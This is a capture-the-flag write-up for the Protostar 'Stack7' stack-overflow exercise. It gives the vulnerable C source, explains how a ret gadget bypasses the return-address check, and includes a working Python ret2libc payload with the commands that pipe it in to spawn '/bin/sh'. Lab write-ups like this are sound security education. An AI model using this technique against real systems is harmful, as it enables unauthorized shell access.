# Stack7

## Source Code

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {       // <- prevent to return to both in libc and stack
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

## Overview & Main Idea

- This challenge is basically the same as stack6, but it's prevent us to use buffer overflow to redirect the program into stack or libc

![img](/stack7/assets/info_proc_map.png)
![img](/stack7/assets/sys_ex_addr.png)
![img](/stack7/assets/ret.png)

- But we can return to any text segment of this program which we can find with objdump and use it like a repeater.

![img](/stack7/assets/text_seg.png)

- Let's find some ret instructions to bypass "if condition" :3

![img](/stack7/assets/ret_addr.png)

- So many rets, but I choose 0x8048383.

```
|          . . . . .
|  + ----------------------+ 
|  |                       | 
|  |   80 bytes padding    | 
|  |                       | 
S  + ----------------------+       
t  |    ret (0x08048383)   |     <- ret of getpath() 
a  + ----------------------+ 
c  |  system (0xb7ecffb0)  | 
k  + ----------------------+ 
|  |   phake ret ("aaaa")  | 
|  + ----------------------+ 
|  | "/bin/sh"(0xb7fb63bf) |     <- feed argument for system()
|  +-----------------------+
|          . . . . .
```

## Exploit

```python
# file name: exp.py

padding = "a"*80
ret_addr = "\x83\x83\x04\x08"
system_addr = "\xb0\xff\xec\xb7"
fake_ret = "a"*4
binsh_addr = "\xbf\x63\xfb\xb7"

payload = ""
payload += padding + ret_addr + system_addr + fake_ret + binsh_addr

print(payload)

# python exp.py > temp.pwn
# (cat temp.pwn; cat) | ./stack7
```

## Result

![img](/stack7/assets/result.png)